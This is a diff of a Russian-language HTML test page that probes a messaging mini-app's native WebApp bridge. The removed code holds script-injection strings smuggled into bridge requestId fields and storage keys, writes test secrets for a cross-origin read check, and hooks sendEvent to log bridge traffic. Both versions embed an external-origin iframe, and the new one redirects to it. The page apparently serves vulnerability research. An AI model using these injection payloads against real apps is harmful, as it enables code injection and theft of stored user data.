@@ -1,124 +1,29 @@
 <!doctype html>
 <html lang="ru">
-<head>
-<meta charset="utf-8">
-<title>Test page</title>
+<head><meta charset="utf-8"><title>Test</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
-  body{font:14px/1.5 ui-monospace,Menlo,monospace;margin:14px;max-width:760px}
-  button{display:block;width:100%;margin:6px 0;padding:10px;text-align:left;cursor:pointer;
-         font:inherit;background:#eef4ff;border:1px solid #88a;font-radius:6px}
-  button:hover{background:#dde8ff}
-  #log{white-space:pre-wrap;background:#111;color:#9f9;padding:10px;margin-top:10px;
-       border-radius:4px;max-height:300px;overflow:auto}
-  .step{color:#336;font-weight:bold}
-</style>
-</head>
+ body{font:15px/1.5 ui-monospace,Menlo,monospace;margin:12px;max-width:760px}
+ #b2{width:100%;padding:16px;font:inherit;font-size:17px;font-weight:bold;background:#ffd;border:2px solid #a80;border-radius:8px;cursor:pointer;margin-top:10px}
+ iframe{width:100%;height:150px;border:2px dashed #999;background:#fffbe6;margin-top:8px}
+ #log{white-space:pre-wrap;background:#111;color:#9f9;padding:10px;margin-top:10px;border-radius:4px;max-height:260px;overflow:auto}
+ .n{background:#336;color:#fff;padding:2px 8px;border-radius:4px}
+</style></head>
 <body>
-<div id="meta"></div>
-<div id="buttons"></div>
+<div>Порядок: сначала <span class="n">КНОПКА 1</span> в жёлтой рамке ниже, потом <span class="n">КНОПКА 2</span> на этой странице.</div>
+<iframe src="https://cdn.jsdelivr.net/gh/nbafan00/dl-check@main/child.xhtml"></iframe>
+<button id="b2">КНОПКА 2 — нажми ПОСЛЕ кнопки 1 (страница сменится — жди 10 сек)</button>
 <div id="log">ready</div>
-
 <script src="https://st.max.ru/js/max-web-app.js"></script>
-<script>
-(() => {
-const PROBE_URL = new URL('probe.txt', location.href).href;
+<script>(() => {
 const RUN = (crypto.randomUUID ? crypto.randomUUID().slice(0,8) : Math.random().toString(36).slice(2,10));
-
 const logEl = document.getElementById('log');
-function log(...a){ const s = a.map(x => typeof x==='object'?JSON.stringify(x):String(x)).join(' ');
-  logEl.textContent += "\n[" + new Date().toTimeString().slice(0,8) + "] " + s; }
+function log(...a){ logEl.textContent += "\n[" + new Date().toTimeString().slice(0,8) + "] " + a.map(x=>String(x)).join(" "); }
 log("run:", RUN, "| platform:", window.WebApp && WebApp.platform, "| version:", window.WebApp && WebApp.version);
-
-function wrapSendEvent(){
-  if (window.WebApp && typeof WebApp.sendEvent === 'function' && !WebApp.__wrapped){
-    const orig = WebApp.sendEvent.bind(WebApp);
-    WebApp.sendEvent = function(name, data){ try{ log("<=", name, data, "|b64:", btoa(String(data))); }catch(e){ log("<=", name, data); } return orig(name, data); };
-    WebApp.__wrapped = true; return true;
-  } return false;
-}
-let weTry=0; const weTimer=setInterval(function(){ if(wrapSendEvent()||++weTry>40) clearInterval(weTimer); },250);
-
-function raw(name,obj){
-  const p = name+":"+JSON.stringify(obj);
-  log("=>", p);
-  try{ window.webkit.messageHandlers.EventHandler.postMessage(p); }
-  catch(e){ log("raw throw:", e.message); }
-}
-
-const box = document.getElementById('buttons');
-
-// 1) K1 — главный тест: сырой requestId в native->JS ответе
-const b1=document.createElement('button');
-b1.innerHTML='<span class="step">ШАГ 1 — инъекция requestId (K1)</span><br>после клика жди ~3 сек и смотри строку "K1 result" внизу лога';
-b1.onclick=()=>{
-  raw("WebAppDeviceStorageGetKey",{requestId:");window.__k1c=1;//", key:'k'+RUN});
-  raw("WebAppDeviceStorageGetKey",{requestId:');window.__k1v=1;document.title="INJECTED-K1";//', key:'k'+RUN});
-  raw("WebAppDeviceStorageGetKey",{requestId:'ok-'+RUN, key:'k'+RUN});
-  setTimeout(()=>log("K1 result: __k1c=", window.__k1c, " __k1v=", window.__k1v, " title=", document.title), 3000);
-};
-box.appendChild(b1);
-
-// 2) E1 — кавычки в key/value
-const b2=document.createElement('button');
-b2.innerHTML='<span class="step">ШАГ 2 — кавычки в key/value (E1)</span><br>аналогично, смотри "E1 result"';
-b2.onclick=()=>{
-  try{
-    WebApp.DeviceStorage.setItem('q"-window.__e1dq=1-"','v').catch(e=>log('e1a',e));
-    WebApp.DeviceStorage.setItem("q'-window.__e1sq=1-'",'v').catch(e=>log('e1b',e));
-    setTimeout(()=>{
-      WebApp.DeviceStorage.getItem('q"-window.__e1dq=1-"').catch(e=>log('e1c',e));
-      WebApp.DeviceStorage.getItem("q'-window.__e1sq=1-'").catch(e=>log('e1d',e));
-    },500);
-  }catch(e){ log('E1 throw', e.message); }
-  raw("WebAppDeviceStorageGetKey",{requestId:'\\");window.__k1bs=1;//', key:'k'+RUN});
-  raw("WebAppDeviceStorageGetKey",{requestId:"\\');window.__k1bs2=1;//", key:'k'+RUN});
-  setTimeout(()=>log("E1 result: __e1dq=", window.__e1dq, " __e1sq=", window.__e1sq, " __k1bs=", window.__k1bs, " __k1bs2=", window.__k1bs2), 4000);
-};
-box.appendChild(b2);
-
-// 3) iframe (Г3): кнопки A и B внутри жёлтого фрейма ниже
-const lab=document.createElement('div');
-lab.innerHTML='<span class="step">ШАГ 3 — жёлтый фрейм ниже (чужой origin)</span>: нажми в нём <b>A</b>, потом <b>B</b>, потом вернись и сделай ШАГ 4';
-box.appendChild(lab);
-const f=document.createElement('iframe');
-f.src='https://cdn.jsdelivr.net/gh/nbafan00/dl-check@main/child.xhtml';
-f.style.cssText='width:100%;height:120px;border:1px dashed #999;background:#fffbe6';
-box.appendChild(f);
-log('iframe loaded');
-
-// 4) K3 — редирект ПОСЛЕДНИМ (уводит страницу)
-const b4=document.createElement('button');
-b4.innerHTML='<span class="step">ШАГ 4 — редирект на чужой origin (K3) — ДЕЛАЙ ПОСЛЕДНИМ</span><br>страница уйдёт на жёлтый приёмник: там нажми A и B — если мост жив, увидишь ответы "<=" внутри приёмника';
-b4.onclick=()=>{ log("=> K3 redirect"); setTimeout(function(){ location.href='https://cdn.jsdelivr.net/gh/nbafan00/dl-check@main/child.xhtml'; },400); };
-box.appendChild(b4);
-
-
-// round 6: K1c backslash-матрица, S5 секрет для кросс-origin чтения
-(function(){
-  const b=document.createElement('button');
-  b.innerHTML='<span class="step">ШАГ 5a — backslash-матрица (K1c)</span>';
-  b.onclick=()=>{
-    raw("WebAppDeviceStorageGetKey",{requestId:'A\\', key:'k'+RUN});
-    raw("WebAppDeviceStorageGetKey",{requestId:"\\';window.__k1g=1;//", key:'k'+RUN});
-    raw("WebAppDeviceStorageGetKey",{requestId:'x\\"-window.__k1h=1-\"', key:'k'+RUN});
-    setTimeout(()=>log("K1c result: __k1g=", window.__k1g, " __k1h=", window.__k1h), 3000);
-  };
-  box.appendChild(b);
-
-  const s=document.createElement('button');
-  s.innerHTML='<span class="step">ШАГ 5b — записать секрет (S5)</span><br>сначала эта кнопка, потом B в жёлтом фрейме';
-  s.onclick=()=>{
-    try{
-      WebApp.DeviceStorage.setItem('probe-secret-shared','SECRET-SHARED-VALUE').then(()=>log('S5: device stored')).catch(e=>log('S5 dev err',e));
-      WebApp.SecureStorage.setItem('probe-secret-sec','SECRET-SEC-VALUE').then(()=>log('S5: secure stored')).catch(e=>log('S5 sec err',e));
-    }catch(e){log('S5 throw',e.message);}
-  };
-  box.appendChild(s);
-})();
-
-document.getElementById('meta').innerHTML="run: <b>"+RUN+"</b> — скопируй лог (внизу) после шагов 1-3, потом делай шаг 4";
-})();
-</script>
-</body>
-</html>
+const t = setInterval(()=>{ if(window.WebApp && typeof WebApp.sendEvent==='function' && !WebApp.__w){
+  const o = WebApp.sendEvent.bind(WebApp);
+  WebApp.sendEvent = function(n,d){ try{ log("<=", n, d, "|b64:", btoa(String(d))); }catch(e){ log("<=", n, d); } return o(n,d); };
+  WebApp.__w = 1; clearInterval(t); } }, 200);
+document.getElementById('b2').onclick = () => { log("=> redirect"); setTimeout(()=>{ location.href='https://cdn.jsdelivr.net/gh/nbafan00/dl-check@main/child.xhtml'; }, 300); };
+})();</script>
+</body></html>
